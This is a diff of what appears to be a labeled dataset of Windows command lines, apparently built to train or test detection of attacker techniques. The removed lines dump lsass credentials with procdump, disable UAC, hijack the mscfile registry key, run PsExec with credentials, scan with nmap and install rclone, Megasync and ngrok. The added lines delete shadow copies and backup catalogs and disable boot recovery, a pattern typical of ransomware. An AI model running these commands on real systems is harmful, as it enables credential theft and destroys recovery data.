@@ -1,315 +1,88 @@
-0	nmap -A ${ip_address} 2> error.log
-0	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-0	wmic shadowcopy call create Volume=C:
-0	cmd /c choco install -f putty
-0	nmap -v -A ${ip_address}
-0	cmd /c choco install -f 7zip
-0	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-0	choco install -y 7zip
-0	powershell -c wmic shadowcopy call create Volume=C:
-0	nmap -p- -sC -sV ${ip_address}
-0	choco install -f psexec
-0	procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
-0	cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-0	choco install rclone
-0	nmap -p- -sC -sV -O ${ip_address} 2> /dev/null
-0	choco install -f Megasync
-0	procdump.exe -accepteula -mm lsass lsassdump.dmp
-0	nmap -p- -sC -sV -O -A ${ip_address}
-0	powershell -c choco install putty
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-0	nmap -F ${ip_address} 2> error.log
-0	cmd /c choco install -y putty
-0	nmap -A ${ip_address}
-0	nmap -p- -sC ${ip_address} 2> &1
-0	wmic.exe shadowcopy call create Volume=C:
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-0	procdump.exe -mm lsass.exe lsassdump.dmp
-0	cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-0	nmap -A ${ip_address} 2> /dev/null
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-0	choco install -y putty
-0	powershell -c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-0	cmd /c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-0	nmap -T5 ${ip_address}
-0	powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-0	powershell -c procdump.exe -ma lsass lsassdump.dmp
-0	cmd /c choco install -y rclone
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-0	cmd /c procdump -mm lsass.exe lsassdump.dmp
-0	nmap -PN ${ip_address} 2> error.log
-0	powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-0	nmap -p- -sC -sV -O ${ip_address} 2> error.log
-0	procdump -ma lsass.exe lsassdump.dmp
-0	cmd /c procdump.exe -accepteula -mm lsass lsassdump.dmp
-0	cmd /c procdump.exe -mm lsass.exe lsassdump.dmp
-0	powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-0	cmd /c vssadmin.exe create shadow /for=C:
-0	cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-0	powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-0	powershell -c choco install -f procdump
-0	choco install Megasync
-0	powershell -c procdump -ma lsass.exe lsassdump.dmp
-0	powershell -c procdump.exe -ma lsass.exe lsassdump.dmp
-0	cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-0	cmd /c choco install rclone
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-0	cmd /c choco install -f ngrok
-0	nmap -PN ${ip_address} 2> /dev/null
-0	cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	cmd /c choco install -f procdump
-0	choco install -f putty
-0	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-0	cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	choco install -y ngrok
-0	nmap -sP ${ip_address} 2> /dev/null
-0	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-0	nmap -sV ${ip_address} 2> /dev/null
-0	nmap -v ${ip_address} 2> &1
-0	powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-0	cmd /c procdump -accepteula -mm lsass lsassdump.dmp
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-0	cmd /c choco install Megasync
-0	nmap -p- -sC ${ip_address} 2> error.log
-0	powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-0	nmap -A ${ip_address} 2> &1
-0	powershell -c choco install -y procdump
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-0	powershell -c procdump -accepteula -mm lsass lsassdump.dmp
-0	cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-0	cmd /c procdump -ma lsass.exe lsassdump.dmp
-0	cmd /c choco install -y 7zip
-0	choco install -f 7zip
-0	cmd /c procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
-0	cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-0	choco install ngrok
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-0	cmd /c choco install 7zip
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	cmd /c choco install ngrok
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-0	nmap ${ip_address}
-0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-0	nmap -sV ${ip_address} 2> error.log
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-0	cmd /c procdump -accepteula -ma lsass.exe lsassdump.dmp
-0	cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-0	choco install -f rclone
-0	nmap -p- ${ip_address} 2> /dev/null
-0	powershell -c choco install -f ngrok
-0	powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-0	powershell -c choco install -f putty
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-0	procdump.exe -mm lsass lsassdump.dmp
-0	powershell -c procdump -accepteula -mm lsass.exe lsassdump.dmp
-0	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	powershell -c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-0	powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-0	nmap -p- -sC -sV ${ip_address} 2> /dev/null
-0	choco install psexec
-0	vssadmin.exe create shadow /for=C:
-0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-0	vssadmin create shadow /for=C:
-0	cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-0	powershell -c choco install psexec
-0	nmap -v -A ${ip_address} 2> &1
-0	nmap -PN ${ip_address} 2> &1
-0	choco install winscp
-0	choco install -y rclone
-0	nmap -p- ${ip_address} 2> error.log
-0	nmap -sC ${ip_address} 2> &1
-0	powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-0	cmd /c procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
-0	nmap -F ${ip_address}
-0	powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-0	cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-0	powershell -c procdump.exe -mm lsass.exe lsassdump.dmp
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-0	powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-0	powershell -c choco install -y putty
-0	procdump.exe -accepteula -ma lsass lsassdump.dmp
-0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-0	powershell -c choco install procdump
-0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-0	cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-0	powershell -c choco install -y ngrok
-0	powershell -c procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
-0	powershell -c procdump -accepteula -ma lsass.exe lsassdump.dmp
-0	cmd /c choco install psexec
-0	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	powershell -c choco install -f rclone
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-0	choco install putty
-0	Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-0	cmd /c procdump -accepteula -mm lsass.exe lsassdump.dmp
-0	nmap -p- ${ip_address}
-0	nmap -sC ${ip_address} 2> /dev/null
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-0	powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-0	nmap -v -A ${ip_address} 2> error.log
-0	nmap -p- -sC -sV -O -A ${ip_address} 2> /dev/null
-0	powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-0	nmap --open ${ip_address} 2> &1
-0	powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-0	powershell -c vssadmin create shadow /for=C:
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-0	powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-0	powershell -c procdump.exe -accepteula -ma lsass lsassdump.dmp
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-0	procdump.exe -ma lsass lsassdump.dmp
-0	powershell -c choco install -y 7zip
-0	powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	nmap -p- -sC ${ip_address} 2> /dev/null
-0	cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-0	cmd /c procdump.exe -ma lsass lsassdump.dmp
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-0	procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
-0	powershell -c choco install ngrok
-0	powershell -c choco install -f 7zip
-0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-0	choco install -y procdump
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-0	nmap --open ${ip_address} 2> /dev/null
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-0	powershell -c choco install -f Megasync
-0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-0	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-0	nmap -T5 ${ip_address} 2> error.log
-0	cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-0	powershell -c procdump -mm lsass lsassdump.dmp
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-0	powershell -c choco install -y rclone
-0	cmd /c procdump.exe -ma lsass.exe lsassdump.dmp
-0	nmap ${ip_address} 2> /dev/null
-0	cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-0	procdump -ma lsass lsassdump.dmp
-0	powershell -c vssadmin.exe create shadow /for=C:
-0	cmd /c procdump.exe -mm lsass lsassdump.dmp
-0	procdump -accepteula -ma lsass.exe lsassdump.dmp
-0	powershell -c choco install -y Megasync
-0	choco install procdump
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-0	nmap -T5 ${ip_address} 2> /dev/null
-0	nmap -p- -sC -sV ${ip_address} 2> error.log
-0	cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-0	powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-0	nmap -sV ${ip_address} 2> &1
-0	powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-0	cmd /c procdump.exe -accepteula -ma lsass lsassdump.dmp
-0	cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-0	nmap --open ${ip_address}
-0	nmap -v -A ${ip_address} 2> /dev/null
-0	cmd /c choco install -y psexec
-0	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-0	cmd /c choco install -y Megasync
-0	nmap -sP ${ip_address}
-0	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-0	cmd /c wmic.exe shadowcopy call create Volume=C:
-0	cmd /c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-0	cmd /c choco install -y ngrok
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-0	cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-0	nmap -p- ${ip_address} 2> &1
-0	cmd /c vssadmin create shadow /for=C:
-0	nmap -sC ${ip_address} 2> error.log
-0	powershell -c procdump -accepteula -ma lsass lsassdump.dmp
-0	powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-0	nmap -p- -sC -sV ${ip_address} 2> &1
-0	powershell -c choco install 7zip
-0	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-0	powershell -c procdump.exe -accepteula -mm lsass lsassdump.dmp
-0	nmap ${ip_address} 2> &1
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-0	procdump.exe -ma lsass.exe lsassdump.dmp
-0	powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-0	nmap -p- -sC ${ip_address}
-0	powershell -c procdump -mm lsass.exe lsassdump.dmp
-0	cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-0	powershell -c choco install rclone
-0	nmap -p- -sC -sV -O ${ip_address}
-0	nmap -p- -sC -sV -O ${ip_address} 2> &1
-0	cmd /c choco install procdump
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-0	cmd /c procdump -mm lsass lsassdump.dmp
-0	nmap -PN ${ip_address}
-0	nmap ${ip_address} 2> error.log
-0	cmd /c procdump -ma lsass lsassdump.dmp
-0	Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-0	nmap -sP ${ip_address} 2> error.log
-0	nmap -v ${ip_address}
-0	cmd /c procdump -accepteula -ma lsass lsassdump.dmp
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-0	choco install -y Megasync
-0	procdump -mm lsass lsassdump.dmp
-0	cmd /c choco install -f psexec
-0	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-0	choco install 7zip
-0	cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-0	nmap -sP ${ip_address} 2> &1
-0	nmap -F ${ip_address} 2> &1
-0	powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-0	nmap -p- -sC -sV -O -A ${ip_address} 2> error.log
-0	cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-0	nmap -v ${ip_address} 2> error.log
-0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-0	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-0	cmd /c choco install -f Megasync
-0	powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-0	powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	nmap -T5 ${ip_address} 2> &1
-0	procdump -accepteula -mm lsass lsassdump.dmp
-0	choco install -y psexec
-0	powershell -c choco install -f psexec
-0	cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-0	powershell -c procdump -ma lsass lsassdump.dmp
-0	nmap --open ${ip_address} 2> error.log
-0	procdump -mm lsass.exe lsassdump.dmp
-0	cmd /c choco install -y procdump
-0	powershell -c choco install Megasync
-0	nmap -v ${ip_address} 2> /dev/null
-0	cmd /c choco install putty
-0	choco install -f procdump
-0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-0	nmap -sC ${ip_address}
-0	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-0	powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	procdump -accepteula -ma lsass lsassdump.dmp
-0	cmd /c choco install -f rclone
-0	powershell -c procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
-0	nmap -sV ${ip_address}
-0	procdump -accepteula -mm lsass.exe lsassdump.dmp
-0	cmd /c wmic shadowcopy call create Volume=C:
-0	cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-0	powershell -c procdump.exe -mm lsass lsassdump.dmp
-0	powershell -c choco install -y psexec
-0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-0	cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-0	nmap -p- -sC -sV -O -A ${ip_address} 2> &1
-0	powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-0	cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-0	nmap -F ${ip_address} 2> /dev/null
-0	powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-0	choco install -f ngrok
+0	cmd /c vssadmin.exe delete shadows /for=c: /all /quiet
+0	wbadmin.exe disable backup
+0	cmd /c vssadmin.exe delete shadows /all /quiet
+0	vssadmin delete shadows /all /quiet
+0	powershell -c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+0	cmd /c bcdedit.exe /set {default} recoveryenabled no
+0	powershell -c wmic.exe shadowcopy where ID="<ShadowID>" delete
+0	cmd /c wbadmin delete catalog
+0	powershell -c vssadmin delete shadows /all /quiet
+0	vssadmin delete shadows /all
+0	wmic.exe shadowcopy delete /interactive
+0	wmic.exe shadowcopy delete /nointeractive
+0	powershell -c wmic.exe shadowcopy delete /nointeractive
+0	wbadmin disable backup
+0	wmic shadowcopy delete /interactive
+0	cmd /c vssadmin.exe delete shadows /for=c: /oldest
+0	cmd /c wbadmin disable backup
+0	cmd /c wbadmin.exe delete catalog
+0	powershell -c wmic.exe shadowcopy delete /interactive
+0	powershell -c wbadmin.exe disable backup
+0	cmd /c wmic shadowcopy delete /nointeractive
+0	powershell -c bcdedit /set {default} bootstatuspolicy ignoreallfailures
+0	bcdedit.exe /set {default} recoveryenabled no
+0	powershell -c wbadmin.exe delete catalog
+0	cmd /c wmic.exe shadowcopy where ID="<ShadowID>" delete
+0	cmd /c vssadmin delete shadows /all /quiet
+0	powershell -c vssadmin.exe delete shadows /for=c: /all /quiet
+0	cmd /c wbadmin.exe disable backup -quiet
+0	cmd /c wbadmin.exe disable backup
+0	powershell -c vssadmin delete shadows /all
+0	powershell -c wmic shadowcopy delete /interactive
+0	cmd /c wbadmin.exe delete catalog -quiet
+0	cmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures
+0	cmd /c wmic shadowcopy delete /interactive
+0	powershell -c wbadmin.exe delete catalog -quiet
+0	vssadmin delete shadows /for=c: /all /quiet
+0	wmic shadowcopy delete /nointeractive
+0	powershell -c vssadmin delete shadows /for=c: /oldest
+0	powershell -c vssadmin delete shadows /for=c: /all /quiet
+0	cmd /c vssadmin.exe delete shadows /all
+0	wmic shadowcopy delete
+0	wbadmin.exe disable backup -quiet
+0	powershell -c bcdedit /set {default} recoveryenabled no
+0	cmd /c vssadmin.exe delete shadows /for=c: /oldest /quiet
+0	wbadmin.exe delete catalog
+0	powershell -c vssadmin delete shadows /for=c: /oldest /quiet
+0	vssadmin.exe delete shadows /all /quiet
+0	bcdedit /set {default} recoveryenabled no
+0	cmd /c wbadmin delete catalog -quiet
+0	powershell -c wbadmin delete catalog -quiet
+0	vssadmin.exe delete shadows /all
+0	wbadmin.exe delete catalog -quiet
+0	cmd /c wmic.exe shadowcopy delete /nointeractive
+0	cmd /c wmic.exe shadowcopy delete /interactive
+0	powershell -c wmic shadowcopy delete
+0	powershell -c vssadmin.exe delete shadows /for=c: /oldest
+0	cmd /c vssadmin delete shadows /for=c: /oldest
+0	vssadmin.exe delete shadows /for=c: /all /quiet
+0	powershell -c vssadmin.exe delete shadows /all
+0	cmd /c 0 wmic shadowcopy where ID="<ShadowID>" delete
+0	cmd /c bcdedit /set {default} recoveryenabled no
+0	powershell -c wbadmin.exe disable backup -quiet
+0	powershell -c wbadmin disable backup
+0	cmd /c vssadmin delete shadows /all
+0	wmic.exe shadowcopy where ID="<ShadowID>" delete
+0	cmd /c wmic shadowcopy delete
+0	bcdedit /set {default} bootstatuspolicy ignoreallfailures
+0	powershell -c 0 wmic shadowcopy where ID="<ShadowID>" delete
+0	cmd /c vssadmin delete shadows /for=c: /oldest /quiet
+0	cmd /c vssadmin delete shadows /for=c: /all /quiet
+0	wmic.exe shadowcopy delete
+0	powershell -c wbadmin disable backup -quiet
+0	vssadmin delete shadows /for=c: /oldest /quiet
+0	vssadmin.exe delete shadows /for=c: /oldest /quiet
+0	vssadmin delete shadows /for=c: /oldest
+0	cmd /c wmic.exe shadowcopy delete
+0	powershell -c vssadmin.exe delete shadows /for=c: /oldest /quiet
+0	powershell -c wmic.exe shadowcopy delete
+0	powershell -c wmic shadowcopy delete /nointeractive
+0	bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+0	wmic shadowcopy where ID="<ShadowID>" delete
+0	wbadmin delete catalog
+0	cmd /c wbadmin disable backup -quiet
+0	cmd /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+0	vssadmin.exe delete shadows /for=c: /oldest
+0	wbadmin disable backup -quiet
+0	powershell -c wbadmin delete catalog
+0	powershell -c vssadmin.exe delete shadows /all /quiet
